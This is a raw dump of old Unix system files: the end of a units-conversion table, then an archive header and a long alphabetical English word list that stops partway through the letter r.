cup			1|2 pt
curie			3.7+10 /sec
dalton			amu
decade			10 yr
dipotre			/m
displacementton		35 ft3
doppelzentner		100 kg
dozen			12
drop			.03 cm3
dyne			cm-gm/sec2
electronvolt		e-volt
ell			45 in
engineerschain		100 ft
engineerslink		100|100 ft
equivalentfootcandle	lumen/pi-ft2
equivalentlux	lumen/pi-m2
equivalentphot		cd/pi-cm2
erg			cm2-gm/sec2
ev			e-volt
faraday			9.652+4 coul
fathom			6 ft
fermi			1-15 m
fifth			4|5 qt
fin			5 dollar
finger			7|8 in
firkin			9 gal
footcandle		lumen/ft2
footlambert		cd/pi-ft2
fortnight		14 da
franklin		3.33564-10 coul
frigorie		kilocal
furlong			220 yd
galileo			1-2 m/sec2
gamma			1-9 weber/m2
gauss			1-4 weber/m2
geodeticfoot		british-ft
geographicalmile	1852 m
gilbert			7.95775-1 amp
gill			1|4 pt
gross			144
gunterschain		22 yd
hand			4 in
hectare			1+4 m2
hefnercandle		.92 cd
hertz			/sec
hogshead		2 barrel
hd			hogshead
homestead		1|4 mi2
horsepower		550 ft-lb-g/sec
hp			horsepower
hyl			gm force sec2/m
hz			/sec
imaginarycubicfoot	1.4 ft3
jeroboam		4|5 gal
karat			1|24
kcal			kilocal
kcalorie		kilocal
kev			1+3 e-volt
key			kg
khz			1+3 /sec
kilderkin		18 gal
knot			nmile/hr
lambert			cd/pi-cm2
last			80 bu
league			3 mi
lightyear		c-yr
line			1|12 in
link			66|100 ft
longhundredweight	112 lb
longquarter		28 lb
lusec			1-6 mm-hg m3/s
mach			331.46 m/sec
magnum			2 qt
marineleague		3 nmile
maxwell			1-8 weber
metriccarat		200 mg
mev			1+6 e-volt
mgd			megagal/day
mh			millihenry
mhz			1+6 /sec
mil			1-2 in
millenium		1000 year
minersinch		1.5 ft3/min
minim			1|60 fldr
mo			month
mpg			mile/gal
mph			mile/hr
nail			1|16 yd
nauticalmile		nmile
nit			cd/m2
noggin			1|8 qt
nox			1-3 lux
ns			nanosec
oersted			2.5+2 pi-amp/m
oe			oersted
pace			36 in
palm			3 in
parasang		3.5 mi
parsec			au-radian/arcsec
pascal			nt/m2
pc			parsec
pennyweight		1|20 oz
percent			%
perch			rd
pf			picofarad
phot			lumen/cm2
pica			1|6 in
pieze			1+3 nt/m2
pipe			4 barrel
point			1|72 in
poise			gm/cm-sec
pole			rd
poundal			ft-lb/sec2
pdl			poundal
proof			1|200
psi			lb-g/in2
quarter			9 in
quartersection		1|4 mi2
quintal			100 kg
quire			25
rad			100 erg/gm
ream			500
registerton		100 ft3
rehoboam		156 floz
rhe			10 m2/nt-sec
rontgen			2.58-4 curie/kg
rood			1.21+3 yd
rope			20 ft
rutherford		1+6 /sec
rydberg			1.36054+1 ev
sabin			1 ft2
sack			3 bu
seam			8 bu
section			mi2
shippington		40 ft3
shorthundredweight	100 lb
shortquarter		25 lb
siemens			/ohm
sigma			microsec
skein			120 yd
skot			1-3 apostilb
slug			lb-g-sec2/ft
span			9 in
spat			4 pi sr
spindle			14400 yd
square			100 ft2
stere			m3
sthene			1+3 nt
stilb			cd/cm2
stoke			1-4 m2/sec
stone			14 lb
strike			2 bu
surveyfoot		british-ft
surveyorschain		66 ft
surveyorslink		66|100 ft
tablespoon		4 fldr
teaspoon		4|3 fldr
tesla			weber/m2
therm			1+5 btu
thermie			1+6 cal
timberfoot		ft3
tnt			4.6+6 m2/sec2
tonne			1+6 gm
torr			mm hg
township		36 mi2
tun			8 barrel
water			.22491|2.54 kg/m2-sec2
wey			40 bu
weymass			252 lb
Xunit			1.00202-13m
-- /usr/lib/w2006 mode=0110664 uid=3 gid=3 atime=169848967 mtime=169259121 --
abilities
ability
able
about
above
absence
absent
absentee
absenteeism
absolute
absolutely
abstract
abstracts
academic
academically
academician
accept
acceptability
acceptable
acceptably
acceptance
acceptances
accepted
accepting
accepts
access
accessed
accesses
accessible
accessing
accession
accessions
accident
accidental
accidentally
accidents
accompany
accompanying
accomplished
accomplishment
accomplishments
accordance
accorded
according
accordingly
account
accountability
accountable
accountancy
accountants
accounted
accounting
accounts
accumulated
accuracy
accurate
accurately
achieve
achieved
achievement
achieving
acknowledge
acknowledging
acknowledgments
acquired
acquiring
acquisition
across
act
acting
action
actions
activated
activates
activation
active
actively
activities
activity
acts
actual
actually
actuate
actuated
acute
acutely
adapt
adapted
adaption
add
added
adding
addition
additional
additions
additive
address
addressed
addresses
addressing
adds
adequacy
adequate
adequately
adhesives
adjacent
adjudged
adjunct
adjuncts
adjust
adjusted
adjusting
adjustment
adjustments
administer
administered
administering
administrate
administrated
administration
administrative
administrator
administrators
admit
admittedly
adopt
adopted
adopting
adoption
advance
advanced
advances
advantage
advantageously
advantages
adversary
adverse
adversely
advise
advised
advisers
advising
advisors
advisory
affairs
affect
affected
affecting
affects
affirmation
affirmative
affirmed
aforementioned
after
afternoon
again
against
age
agencies
agency
agent
ago
agree
agreeable
agreed
agreement
agreements
agrees
ahead
aid
aide
aided
aids
aimed
air
alert
algebraic
algol
algorithm
algorithms
all
allocate
allocated
allocates
allocation
allocations
allow
allowable
allowance
allowed
allowing
allows
almost
alone
along
alphabet
already
also
alter
alteration
altered
alternate
alternating
alternation
alternative
alternatively
alternatives
although
always
america
american
among
amount
amounts
amplifier
amplitude
an
analog
analogous
analogy
analyses
analysis
analyst
analysts
analytic
analytical
analyze
analyzed
analyzer
analyzing
ancillary
and
angle
animal
announced
announcements
announces
annual
anode
anodes
another
answer
answered
answering
answers
anticipated
any
anyone
anything
anyway
apart
apparatus
apparent
apparently
appeal
appealing
appeals
appear
appearance
appeared
appearing
appears
append
appended
appendices
appending
appendix
appends
applicability
applicable
applicant
applicants
application
applications
applied
applies
apply
applying
appointed
appointment
appoints
appraisals
approach
approached
approaches
approaching
appropriate
appropriately
appropriateness
approval
approvals
approve
approved
approximate
approximated
approximately
approximation
april
arbitrarily
arbitrary
are
area
areas
argue
argued
argument
arguments
arise
arisen
arises
arising
arithmetic
arose
around
arrange
arranged
arrangement
arrangements
arranges
arranging
array
arrays
arrival
arrive
arrives
arriving
art
article
arts
as
ascertain
ascertained
aside
ask
asked
asking
asks
aspect
aspects
assembly
assess
assessed
assessment
asset
assets
assign
assignable
assigned
assigning
assignment
assignments
assigns
assist
assistance
assistant
assistants
assisted
associate
associated
associating
association
assume
assumed
assumes
assuming
assumption
assumptions
assurance
assure
assured
assures
asymmetric
at
atmosphere
atmospheric
atom
attach
attached
attack
attempt
attempted
attempting
attempts
attend
attendance
attendant
attended
attention
attitude
attitudes
attorney
attract
attraction
attractive
attractiveness
attributable
attributes
audio
augment
augmentation
augmented
augmenting
august
author
authorities
authority
authorization
authorizations
authorize
authorized
authorizing
authors
automated
automatic
automatically
auxiliary
availability
available
average
averaged
averages
averaging
avoid
avoidance
avoided
avoiding
aware
awareness
away
axes
axis
back
background
backgrounds
bad
badly
balance
balanced
ball
band
bandwidth
bank
banking
banks
bar
bars
base
based
bases
basic
basically
basis
batch
be
bear
bearer
bearing
became
because
become
becomes
becoming
been
before
began
begin
beginning
begins
begun
behavior
behavioral
behind
being
belief
beliefs
believe
believed
believes
bell
belong
belonging
belongings
below
beneath
beneficial
benefit
benefits
bent
besides
best
better
betterment
between
beyond
big
bigger
biggest
bill
billed
billing
bills
binary
biometrika
bit
bits
black
blank
blanks
block
blocked
blocking
blocks
blue
board
boards
body
bold
bond
bonds
book
books
borrow
borrowed
both
bottom
bottoms
bought
bound
boundaries
boundary
bounded
bounds
box
branch
branches
break
breakdown
breaker
breakers
brief
briefed
briefing
briefly
bring
brings
broad
broadened
broader
broadest
broadly
broken
brought
brown
bubble
budget
budgetary
budgets
build
building
buildings
builds
built
bureau
bureaucracy
bureaucratic
burning
bus
buses
business
busy
but
buy
buyer
buying
buys
by
bypass
bypassing
cabinet
cabinets
cable
cabling
calculate
calculated
calculates
calculating
calculation
calculations
calendar
caliber
calibrated
calibrates
calibration
california
call
called
calling
calls
came
can
candidate
candidates
cannot
capabilities
capability
capable
capacity
capital
capitalization
capitalize
capitalized
card
cards
care
career
careful
carefully
carried
carries
carroll
carry
carrying
case
cases
casual
casually
catalog
catalogs
categories
category
cathode
cathodes
catholic
caught
cause
caused
causes
causing
cease
ceases
cell
cells
center
centered
centers
central
centrally
centuries
century
certain
certainly
chain
chained
chaining
chairman
chairmen
chance
chances
chang
change
changed
changes
changing
channel
channels
chapter
chapters
character
characteristic
characteristics
characterize
characterized
characterizes
characters
charge
chargeable
charged
charges
charging
chart
charter
chartered
charts
cheaper
cheapest
check
checked
checking
checks
chemical
chemicals
chemistry
chief
chiefs
children
choice
choices
choose
choosing
chosen
circle
circles
circuit
circuitry
circuits
circumstances
cited
cites
citing
citizens
city
civil
claim
claimed
claiming
claims
class
classes
classification
classified
clean
cleaning
cleanliness
clear
clearance
cleared
clearing
clearly
clears
clerical
clerk
clerks
clock
close
closed
closely
closer
closes
closest
closing
closure
clue
cluster
clustering
clusterings
clusters
cm
code
codes
codifying
coding
coefficient
coefficients
coffee
coherency
coherent
cold
collaboration
collaborative
colleagues
collected
collection
collections
collective
collects
college
color
colored
column
columns
combination
combinations
combinatorial
combine
combined
combining
come
comes
coming
command
commands
comment
comments
commerce
commercial
commercially
commitment
commitments
committed
committee
committees
common
commonly
communicate
communicated
communicates
communicating
communication
communications
communist
communities
community
compact
companies
companion
companions
company
comparability
comparable
comparative
comparatively
compare
compared
compares
comparing
comparison
comparisons
compatibility
compatible
compensate
compensating
compensation
compensatory
compete
competence
competency
competent
competently
competes
competing
competition
competitive
compilation
compilations
compiled
compiler
compilers
compiles
compiling
complement
complementary
complements
complete
completed
completely
completes
completion
complex
complexities
complexity
compliance
complicate
complicated
complicating
component
components
composed
composite
composition
compositions
comprehend
comprehended
comprehending
comprehension
comprehensive
comprise
comprises
comprising
compromise
compromised
compromises
computation
computational
computations
compute
computed
computer
computerized
computers
computes
computing
conceivable
conceived
concentrate
concentrated
concentration
concept
conceptions
concepts
conceptually
concern
concerned
concerning
concerns
conclude
concluded
concludes
conclusion
conclusions
condensed
condition
conditional
conditionally
conditioned
conditioning
conditions
conducive
conduct
conducted
conductivity
conductor
conductors
conference
conferences
confidence
confident
confidential
confidentiality
configuration
configurations
confirm
confirmation
confirmations
confirmed
confirms
confounded
confounding
confuse
confused
confusion
congruent
conjectured
conjectures
connect
connected
connecting
connection
connections
connects
conscious
consequence
consequences
consequently
consider
considerable
considerably
consideration
considerations
considered
considering
considers
consist
consisted
consistency
consistent
consisting
consists
constant
constants
constitute
constituting
constrain
constrained
constraint
constraints
construct
constructed
constructing
construction
constructs
consult
consultant
consultants
consulted
consulting
consults
consumable
consumed
consumer
consuming
consumption
contact
contacted
contacts
contain
contained
containers
containing
contains
contemplate
content
contention
contents
context
continuation
continue
continued
continues
continuing
continuity
continuous
continuously
contract
contractions
contractor
contracts
contractual
contradicting
contradiction
contradictions
contrast
contributed
contributions
control
controllable
controlled
controller
controlling
controls
convenience
convenient
conveniently
convention
conventional
conventions
conversant
conversation
conversations
converse
conversely
conversion
convert
converted
converter
convertibility
converting
convey
conveyed
convince
convinced
convincing
cooperate
cooperates
cooperation
cooperative
cooperators
coordinate
coordinated
coordinates
coordinating
copied
copies
copy
core
corner
corners
corporate
corporation
correct
corrected
correcting
correction
corrections
corrective
correctly
correctness
corrects
correlated
correlation
correlations
correspond
corresponded
correspondence
corresponding
corresponds
cosines
cost
costing
costly
costs
could
council
councils
count
counted
counter
counting
countries
country
counts
couple
coupled
coupling
course
courses
court
cover
covered
covering
covers
create
created
creates
creating
creation
creative
creativeness
credit
crisis
criteria
criterion
critical
critically
criticism
criticisms
criticize
criticized
critics
crop
crops
cross
crossovers
cubic
cultural
culture
cultures
currencies
currency
current
currently
curve
curves
customer
customers
cut
cutoff
cuts
cutting
cycle
cycles
cyclic
cycling
daily
dallas
damage
damaged
damages
damaging
danger
dangerous
dark
data
date
dated
dates
day
days
dead
deal
dealing
deals
dealt
debug
debugged
debugging
december
decide
decided
decides
deciding
decision
decisions
declared
decoded
decoder
decoding
decomposition
decrease
decreases
decreasing
deep
deeply
defect
defective
defects
defend
defendant
defendants
defense
define
defined
defines
defining
definite
definitely
definition
definitions
degree
degrees
delay
delayed
delaying
delays
delete
deleted
deletes
deleting
deletion
deletions
deliver
deliverable
delivered
delivers
delivery
demand
demanding
demands
demonstrate
demonstrated
demonstration
demonstrations
density
deny
department
departmental
departments
departure
departures
depend
dependency
dependent
depending
depends
depicted
deposit
deposition
deposits
depth
derive
derived
deriving
descendant
descendants
descending
describe
described
describes
describing
description
descriptions
descriptive
descriptors
design
designate
designated
designating
designed
designing
designs
desirability
desirable
desire
desired
desires
desiring
despite
destination
detail
detailed
detailing
details
detect
detected
detecting
detection
detects
determination
determine
determined
determines
determining
develop
developed
developers
developing
development
developments
develops
deviance
deviant
deviation
deviations
device
devices
diagnose
diagnosed
diagnoses
diagnostic
diagonal
diagram
diagrams
dial
dialing
diameter
dictated
dictates
dictionary
did
die
dielectric
differ
differed
difference
differences
different
differential
differentiate
differentiating
differently
differing
differs
difficult
difficulties
difficulty
diffusion
digit
digital
digits
dimension
dimensional
dimensionality
dimensions
direct
directed
direction
directions
directive
directives
directly
director
directories
directors
directory
disagreement
disagreements
disappear
disappears
discharge
discharges
disclose
disclosed
discloses
disclosure
disconnected
discount
discounts
discourage
discouraged
discourages
discouraging
discover
discovered
discovers
discovery
discrepancies
discrepancy
discrete
discriminable
discriminate
discriminated
discriminating
discrimination
discriminatory
discuss
discussed
discusses
discussing
discussion
discussions
dispense
dispensing
display
displayed
displaying
displays
disposal
disposed
dissimilar
dissimilarities
dissimilarity
distance
distances
distant
distinct
distinction
distinctions
distinctive
distinctly
distinguish
distinguished
distinguishing
distorted
distortion
distortions
distractions
distribute
distributed
distributing
distribution
distributions
disturb
disturbed
disturbing
diverse
divide
divided
divides
division
divisions
do
document
documentation
documented
documenting
documents
does
doing
dollars
domain
dominance
dominant
dominated
done
door
doors
doped
dotted
double
doubling
doubt
doubtful
down
dr
draft
drafting
drafts
draftsman
drastically
draw
drawing
drawings
drawn
drew
drink
drinks
drive
drives
driving
drop
dropped
dropping
drops
dubious
due
duplicates
duplicating
duplication
duration
during
dust
duties
duty
dynamic
each
earlier
earliest
early
earmarked
earth
ease
eased
easier
easily
east
easy
economic
economical
economically
economics
economists
economy
edge
edges
edit
edited
editing
editor
editorial
editors
educate
educated
educating
education
educational
educationally
effect
effective
effectively
effectiveness
effects
efficiency
efficient
efficiently
effort
efforts
eight
either
elaborate
electric
electrical
electrode
electrodes
electron
electronic
electronically
electronics
electrons
element
elements
eliminate
eliminated
eliminates
eliminating
elimination
else
elsewhere
embedded
embedding
embodies
embodiment
embodiments
embodying
emergencies
emergency
emotional
emotionally
emotions
emphasis
emphasized
emphasizes
empirical
empirically
employed
employee
employees
employer
employment
empty
enable
enabled
enables
enabling
enclose
enclosed
encloses
encode
encoded
encoding
encounter
encountered
encounters
encourage
encouraged
encouragement
encourages
end
ended
ending
ends
energy
enforced
enforcement
enforcing
engage
engaged
engineer
engineering
engineers
english
enhance
enhanced
enhancement
enjoy
enjoys
enlarged
enough
ensure
ensures
enter
entered
entering
enters
enthusiasm
enthusiastic
entire
entirely
entities
entitled
entity
entries
entry
envelope
environment
environmental
environments
environs
epitaxial
equal
equality
equally
equals
equated
equation
equations
equilibrium
equipment
equipped
equitable
equivalence
equivalent
equivalently
error
errors
escape
especially
essential
essentially
essentials
establish
established
establishing
establishment
establishments
estimate
estimated
estimates
estimation
et
etc
evaluate
evaluated
evaluating
evaluation
evaluations
even
evening
event
events
ever
every
everybody
everyone
everyones
everything
everywhere
evidence
evidenced
evident
evidently
evil
exact
exactly
exaggerated
exaggerates
examination
examinations
examine
examined
examines
examining
example
examples
exceed
exceeded
exceeding
exceedingly
exceeds
excellence
excellent
except
exception
exceptionally
exceptions
excess
excessive
excessively
exchange
exclude
excluded
exclusive
executable
execute
executed
executes
executing
execution
executive
executives
exercise
exercised
exercises
exhaust
exhaustion
exhaustive
exhibit
exhibited
exhibitions
exist
existed
existence
existent
existing
exists
exit
exiting
exits
expand
expanded
expanding
expansion
expect
expectancy
expectation
expected
expects
expedite
expeditious
expendable
expended
expenditure
expenditures
expense
expenses
expensive
experience
experienced
experiences
experiment
experimental
experimentally
experimentation
experimented
experimenters
experimenting
experiments
expert
expertise
experts
explain
explained
explaining
explains
explanation
explicit
explicitly
exploit
exploitation
exploited
exploration
exploratory
explore
explored
exponential
exponentially
exposed
exposure
express
expressed
expression
expressions
extend
extended
extending
extension
extensive
extensively
extent
external
extinguished
extra
extracted
extracting
extreme
extremely
extremes
fabricated
face
faced
faces
facilitate
facilitated
facilities
facility
fact
factor
factorial
factors
facts
faculties
faculty
fail
failed
failing
fails
failure
failures
fair
fairly
fairness
faith
fall
falls
false
familiar
families
family
far
fashion
fast
faster
fastest
favor
favorable
fear
feasibility
feasible
feature
features
february
federal
federally
feed
feedback
feel
feeling
feels
feet
felt
female
females
few
fewer
field
fields
fifteen
fifth
fig
figs
figure
figures
file
filed
files
filing
fill
filled
filling
fills
film
filter
filtered
filtering
filters
final
finally
finance
financed
finances
financial
financing
find
finding
findings
finds
fine
finely
finish
finished
finite
fire
fires
firm
firmly
first
fiscal
fiscally
fit
fits
fitted
fitting
five
fix
fixed
flat
flexibility
flexible
flip
floor
flop
flops
flow
flowing
follow
followed
following
follows
food
foot
for
force
forced
forceful
forces
foregoing
foreign
forest
form
formal
formally
format
formation
formats
formatted
formed
former
forming
forms
formula
formulae
formulated
formulation
forth
fortran
forward
found
four
fourth
fraction
fractions
frame
frames
framework
framing
free
freed
freedom
freely
french
frequencies
frequency
frequent
frequently
fresh
friend
friendly
friends
from
front
fulfill
fulfilled
fulfilling
full
fully
function
functional
functionally
functioning
functions
fund
fundamental
funded
funding
funds
furnish
furnished
furnishes
further
furthermore
future
gain
gained
gainers
gaining
gains
gap
gas
gaseous
gases
gate
gates
gather
gathered
gathering
gating
gauge
gauges
gave
general
generalist
generalists
generality
generalization
generalize
generalized
generally
generals
generate
generated
generates
generating
generation
generator
generators
geographical
geographically
geometries
geometry
german
germany
get
gets
getting
give
given
gives
giving
glance
glass
glasses
global
glow
go
goal
goals
goes
going
gone
good
goods
govern
governed
governing
government
governmental
governments
gradually
graduate
graduates
graduating
grant
granted
granting
graph
graphic
graphical
graphics
graphs
great
greater
greatest
greatly
green
gross
grossly
ground
grounded
grounds
group
grouped
grouping
groupings
groups
grow
growing
grown
grows
growth
guarantee
guaranteed
guaranteeing
guarantees
guard
guarded
gudeance
guess
guessed
guesses
guests
guidance
guide
guided
guidelines
guiding
habit
habits
had
hair
half
hall
halls
hand
handbook
handle
handled
handler
handles
handling
hands
hang
hanging
hangs
happen
happened
happening
happens
hard
harder
hardly
hardware
has
have
having
hazy
he
head
headings
heads
health
healthy
hear
heard
hearing
heat
heating
heavily
heavy
height
heights
held
help
helped
helpful
helps
hence
her
here
herein
hereinafter
hers
hesitate
hidden
hierarchal
hierarchical
hierarchy
high
higher
highest
highly
hill
him
himself
hire
hired
hiring
his
historic
historical
history
hold
holding
holds
hole
holes
holidays
home
hook
hope
hoped
hopefully
hopes
horizontal
horizontally
hospital
hospitals
host
hot
hour
hours
house
houses
housing
how
however
human
humanly
humans
hundred
hundreds
hypotheses
hypothesis
hypothesized
hypothetical
idea
ideal
ideally
ideas
identical
identifiable
identification
identifications
identified
identifies
identify
identifying
identity
idle
if
ignore
ignored
ignores
ignoring
illness
illustrate
illustrated
illustrates
illustrating
illustration
illustrations
illustrative
illustratively
image
images
immediate
immediately
impact
impedance
impede
implement
implementation
implemented
implementing
implementors
implications
implicitly
implied
implies
imply
implying
importance
important
impose
imposed
impossibility
impossible
impressed
impression
impressions
impressive
impressively
improve
improved
improvement
improvements
improving
impurities
impurity
in
inability
inaccessible
inactive
inadequacy
inadequate
inappropriate
inches
inclination
inclined
include
included
includes
including
incoming
incompetence
incompetent
incomplete
inconsistent
inconvenience
inconvenienced
inconvenient
incorporate
incorporated
incorporates
incorporating
incorporation
incorrect
incorrectly
increase
increased
increases
increasing
increasingly
increment
incremental
incremented
incrementing
increments
incur
incurred
incurring
indeces
indeed
indefinite
independence
independent
independently
index
indexed
indexes
indexing
india
indicate
indicated
indicates
indicating
indication
indications
indicative
indicator
indicators
indices
indifferent
individual
individualized
individuals
industrial
industry
ineffective
inefficiency
inefficient
inequalities
inequality
inexperienced
infer
inference
inferences
influence
influencing
influential
inform
informal
informally
information
informational
informations
informative
informed
informing
infrequently
inherent
inhibits
initial
initialed
initialization
initialize
initializes
initially
initiate
initiated
initiating
initiation
initiative
inner
input
inputs
insert
inserted
inserting
insertion
insertions
inserts
inside
insight
insights
insist
instability
install
installation
installations
installed
installing
instance
instances
instant
instantaneously
instead
institute
instituted
institutes
institution
institutional
institutions
instructed
instruction
instructional
instructions
instructor
instructors
insufficient
insurance
insure
insured
insures
integer
integers
integral
integrated
integrating
intellectual
intelligibility
intelligible
intended
intends
intense
intensely
intensity
intensive
intent
inter
interact
interacting
interaction
interactions
interactive
interacts
interchange
interchangeable
interchangeably
interconnect
interconnected
interconnection
interconnections
interconnects
interest
interested
interesting
interests
interface
interfaces
interior
interlocation
intermediary
intermediate
internal
internally
international
internationally
interpret
interpretable
interpretation
interpretations
interpreted
interrelationship
interrelationships
interrupt
interrupted
interrupting
interruption
interruptions
interstage
interval
intervals
interview
interviewed
interviewing
interviews
intimate
intimately
into
introduce
introduced
introduces
introducing
introduction
introductory
invalid
invalidates
invent
invented
invention
inventive
inventor
inventories
inventory
inverse
inversely
inverted
inverter
invest
investigate
investigated
investigation
investigations
investment
investments
invite
invites
involve
involved
involvement
involves
involving
ion
ions
irrelevant
is
isolate
isolated
isolation
issue
issued
issues
it
item
itemized
items
iteration
iterations
its
itself
james
january
jargon
jersey
job
jobs
john
johnson
join
joined
joint
jointly
journal
journals
jr
judge
judged
judgment
judgmental
judgments
judicious
judiciously
july
jump
jumps
june
just
justice
justification
justified
justify
justifying
keep
keeping
keeps
kennedy
kept
key
keyed
keys
kill
kind
kinds
knew
know
knowing
knowingly
knowledge
knowledgeable
known
knows
label
labeled
labeling
labelled
labelling
labels
laboratories
laboratory
lack
lacking
lacks
lag
laid
land
language
languages
large
largely
larger
largest
laser
lasers
last
late
later
latest
latter
law
laws
lay
layer
layers
laying
layout
layouts
lays
lead
leader
leaders
leadership
leading
leads
learn
learned
learning
least
leave
leaves
leaving
led
left
leftmost
legal
legally
legitimate
lend
lending
length
lengthening
lengthens
lengths
lengthy
less
lessened
lesser
let
lets
letter
letters
letting
level
levels
liability
liable
liason
liberal
liberalized
librarian
librarians
libraries
library
lie
lies
life
light
lighting
lights
like
likely
likened
likewise
limit
limitation
limitations
limited
limiting
limits
line
linear
linearly
lines
link
linkage
linkages
linked
linking
links
list
listed
listing
lists
literal
literally
literature
little
live
lived
load
loaded
loading
loads
loan
loaned
loans
local
locally
locate
located
locates
locating
location
locations
log
logged
logging
logic
logical
long
longer
longest
look
looked
looking
looks
loop
loops
lose
loses
losing
loss
losses
lost
lot
low
lower
lowest
machine
machinery
machines
made
magnetic
magnitude
magnitudes
mail
mailed
mailing
mails
main
mainly
maintain
maintained
maintaining
maintains
maintenance
major
majority
majors
make
maker
makers
makes
making
male
males
man
manage
manageable
managed
management
managements
manager
managerial
managers
managing
manipulate
manipulation
manned
manner
manning
manual
manually
manuals
manufactured
manufacturer
manufacturers
manufacturing
manuscript
manuscripts
many
map
mapped
mapping
maps
march
margin
marginal
margins
mark
marked
markedly
market
marketability
marketing
markets
marking
marks
mask
masked
masking
mass
master
mastered
masters
match
matched
matches
matching
material
materials
mathematical
mathematically
mathematician
mathematicians
mathematics
matrices
matrix
matter
matters
maximizes
maximum
may
me
mean
meaning
meaningful
meaningfulness
meaningless
meanings
means
meant
measurable
measure
measured
measurement
measurements
measures
measuring
mechanical
mechanics
mechanism
mechanisms
media
median
medical
medicine
medium
meet
meeting
meetings
meets
member
members
membership
memberships
memoranda
memorandum
memory
men
mention
mentioned
mere
merely
merge
merged
merging
merit
message
messages
met
metal
metallization
metallurgy
metals
method
methodological
methodologies
methodology
methods
metric
microfilm
middle
might
mileage
miles
military
million
mind
minded
minds
minimal
minimize
minimized
minimizes
minimizing
minimum
minister
minor
minority
minute
minutes
miscellaneous
missed
missing
mistake
mistakes
mix
mixed
mixes
mixture
mode
model
modeling
models
moderate
modern
modes
modification
modifications
modified
modifies
modify
modifying
modular
module
modules
modulo
moment
momentarily
money
monitor
monotone
monotonic
monotonically
month
monthly
months
moon
moral
more
moreover
morgan
morning
most
mostly
motivated
motivation
motor
mount
mounted
mounting
move
moved
moves
moving
much
multi
multidimensional
multiple
multiplication
multiplied
multiplier
multipliers
multiply
multiprogram
multiprogrammed
multiprogramming
multistage
multivariate
murder
murray
must
mutually
my
name
named
namely
names
naming
narrow
nation
national
nationally
nations
natural
naturally
nature
near
nearer
nearest
nearly
necessarily
necessary
necessitate
necessitates
necessity
need
needed
needing
needs
negate
negated
negative
neglect
neglected
neighbor
neighboring
neither
net
network
networks
neutral
never
nevertheless
new
newer
newest
newly
news
next
nice
night
nine
no
nobody
node
nodes
noise
noisy
non
none
nonexistence
nonlinear
nonlinearity
nonowners
nonzero
nor
norm
normal
normality
normalized
normalizes
normally
norms
north
not
notable
notably
notation
note
noted
notes
noteworthy
nothing
notice
noticeable
noticeably
noticed
notification
notified
notify
noting
novel
november
now
nuclear
number
numbered
numbering
numbers
numeric
numerical
numerically
numerous
object
objectionable
objective
objectively
objectives
objects
obligation
obligatory
observation
observations
observe
observed
observer
observing
obsolete
obtain
obtained
obtaining
obtains
obvious
obviously
occasion
occasional
occasionally
occupancy
occupations
occupied
occupies
occupy
occupying
occur
occurred
occurrence
occurrences
occurring
occurs
october
odd
of
off
offer
offered
offering
offerings
offers
office
officer
officers
offices
official
officially
officials
often
oil
old
older
omission
omitted
on
once
one
ones
only
onto
open
opened
opening
openings
opens
operable
operate
operated
operates
operating
operation
operational
operations
operative
operator
operators
opinion
opinions
opportunism
opportunities
opportunity
opposite
optical
optically
optimal
optimality
optimistic
optimization
optimum
option
options
or
oral
orally
order
ordered
ordering
orderings
orderly
orders
ordinary
organization
organizational
organizations
organize
organized
organizer
organizing
orientation
oriented
origin
original
originally
originals
originated
originating
originator
orthogonal
other
others
otherwise
ought
our
ourselves
out
outcome
outcomes
outgoing
outline
outlined
outlines
outlining
output
outputs
outs
outset
outside
outsiders
over
overall
overhead
overlap
overlaps
overly
overview
overviews
own
owned
owner
owners
owns
package
packages
packing
packs
page
pages
paid
pain
painful
pair
paired
pairs
panel
panels
paper
papers
paragraph
paragraphs
parallel
parameter
parameters
paramount
part
partial
partially
participants
participated
participating
particular
particularly
parties
partition
partitioned
partitioning
partitions
partly
parts
party
pass
passage
passed
passes
passing
past
patent
patentable
patented
patents
path
paths
patient
patients
pattern
patterns
pause
pauses
pay
pays
peak
pension
pensions
people
per
perceived
percent
percentage
percentages
perceptible
perceptibly
perceptions
perceptual
perfect
perfectly
perform
performance
performed
performing
performs
perhaps
period
periodic
periodically
periodicals
periods
peripheral
peripherals
periphery
permanent
permanently
permissible
permission
permissions
permissive
permit
permits
permitted
permitting
person
personal
personalized
personally
personnel
persons
pertain
pertaining
pertains
pertinent
perusal
phase
phased
phases
phenomena
philosophy
photocopied
photocopies
photocopy
photocopying
physical
physically
pick
picked
picking
pickup
pictorial
picture
pictures
piece
pieces
pile
piles
pilot
pipe
piped
pipes
pitfalls
place
placed
places
placing
plan
planar
plane
planned
planner
planning
plans
plant
plants
plausible
play
played
players
playing
plays
pleasant
please
pleased
pleasing
plots
plotted
plotter
plotters
plotting
plurality
plus
point
pointed
pointer
pointers
pointing
points
polarity
police
policies
policy
political
politically
pollution
polymers
polynomial
polynomials
pool
pooled
pooling
pools
poor
poorer
poorly
popular
popularity
populating
population
porter
portion
portions
position
positions
positive
possess
possession
possibilities
possibility
possible
possibly
post
posts
potential
potentially
power
powerful
practicable
practical
practice
practiced
practices
practicing
practitioners
preassigned
precede
preceded
preceding
precise
precisely
precision
predetermined
predict
predicted
predicting
prediction
predictions
prefer
preferable
preference
preferences
preferred
premium
premiums
preparation
prepare
prepared
preparing
prescription
presence
present
presentation
presentations
presented
presently
presents
press
pressed
pressure
pressurized
presumably
presumed
pretty
prevent
prevented
preventing
preventive
prevents
previous
previously
price
priced
prices
pricing
primarily
primary
prime
priming
principal
principle
principles
print
printed
printer
printers
printing
prints
prior
priori
priorities
priority
privacy
private
privilege
privileged
privileges
probabilities
probability
probable
probably
problem
problematical
problems
proc
procedural
procedure
procedures
proceed
proceeded
proceeding
proceeds
process
processed
processes
processing
processor
processors
produce
produced
produces
producing
product
production
productive
productivity
products
profession
professional
professionalism
professionally
professionals
professor
professors
profile
profiles
program
programmed
programmer
programmers
programming
programs
progress
progresses
prohibited
prohibitively
prohibits
project
projected
projection
projections
projectors
projects
promotion
promotional
promotions
prompt
prompting
promptly
pronounced
proof
propagate
propagated
propagating
propagation
proper
properly
properties
property
proportion
proportional
proportionate
proportions
proposal
proposals
propose
proposed
proposes
prospects
protect
protected
protecting
protection
protects
proters
prove
proved
proven
proves
provide
provided
provides
providing
proving
provision
provisional
provisionally
provisions
public
publication
publications
publicly
publish
published
pulse
pulses
purchase
purchased
purchases
purchasing
pure
purely
purpose
purposes
pushed
pushing
put
puts
putting
qualities
quality
quantities
quantity
quantization
quarter
quarterly
question
questionable
questioning
questionnaire
questionnaires
questions
quick
quickly
quiet
quite
quote
quoted
quotes
radio
raise
raised
random
randomly
range
ranged
ranges
ranging
rank
ranking
rankings
ranks
rapid
rapidly
rare
rarely
rate
rated
rates
rather
rating
ratings
ratio
rational
ratios
ray
rays
reach
reached
